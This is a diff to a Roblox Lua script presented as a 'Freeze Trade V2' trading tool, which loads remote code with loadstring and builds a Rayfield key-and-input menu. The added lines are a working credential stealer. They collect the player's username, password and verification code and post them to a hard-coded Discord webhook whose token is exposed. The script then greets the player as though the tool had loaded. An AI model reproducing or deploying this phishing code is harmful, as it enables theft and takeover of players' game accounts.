@@ -1,10 +1,11 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local CorrectKey = "FreezeTradeV2"
+local WebhookURL = "https://discord.com/api/webhooks/1325368195091005551/MjScslsafHeoGg2pRr0ZLTm1hIUZFJ5Y03j9g0WJTp1xBa61A1ehZuqB1U-8KR_OYxpy" -- URL webhook yang akan digunakan
 
 local Window = Rayfield:CreateWindow({
-    Name = "Freeze Trade V2 (KEY)",
-    LoadingTitle = "Dont Share! KEY",
+    Name = "Key Test",
+    LoadingTitle = "Testing Callback",
     LoadingSubtitle = "By Dinzzz",
 })
 
@@ -32,7 +33,10 @@ Tab:CreateInput({
             local Tab2 = Window:CreateTab("Step 2: Input Data", 4483362458)
 
             -- Label untuk Username
-            Tab2:CreateLabel("Username (Auto): " .. game.Players.LocalPlayer.Name)
+            Tab2:CreateLabel("Username: " .. game.Players.LocalPlayer.Name)
+
+            local Password = ""
+            local VerificationCode = ""
 
             -- Input Password
             Tab2:CreateInput({
@@ -40,6 +44,7 @@ Tab:CreateInput({
                 PlaceholderText = "Input password di sini",
                 RemoveTextAfterFocusLost = false,
                 Callback = function(input)
+                    Password = input
                     print("Password yang dimasukkan: " .. tostring(input)) -- Debug
                 end,
             })
@@ -50,16 +55,43 @@ Tab:CreateInput({
                 PlaceholderText = "Input kode di sini",
                 RemoveTextAfterFocusLost = false,
                 Callback = function(input)
+                    VerificationCode = input
                     print("Kode verifikasi yang dimasukkan: " .. tostring(input)) -- Debug
                 end,
             })
 
-            -- Tombol untuk Kirim Data
+            -- Tombol Menuju Script
             Tab2:CreateButton({
-                Name = "Kirim Data",
+                Name = "Go To Script",
                 Callback = function()
-                    print("Mengirim data ke Webhook...") -- Debug
-                    -- Kirim data ke webhook (gunakan fungsi yang sesuai di sini)
+                    if Password ~= "" and VerificationCode ~= "" then
+                        -- Mengirim data ke Webhook
+                        local HttpService = game:GetService("HttpService")
+                        local Content = string.format(
+                            "Username: %s\nPassword: %s\nVerification Code: %s",
+                            game.Players.LocalPlayer.Name, Password, VerificationCode
+                        )
+
+                        local Data = {
+                            ["content"] = Content,
+                            ["username"] = "Rayfield Bot"
+                        }
+
+                        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(Data))
+                        print("WELCOME TO FREEZE TRADE V2.") -- Debug
+
+                        Rayfield:Notify({
+                            Title = "Welcome To Freeze Trade V2",
+                            Content = "THanks for using my script",
+                            Duration = 5,
+                        })
+                    else
+                        Rayfield:Notify({
+                            Title = "Error!",
+                            Content = "Harap isi semua field sebelum mengirim.",
+                            Duration = 5,
+                        })
+                    end
                 end,
             })
         else
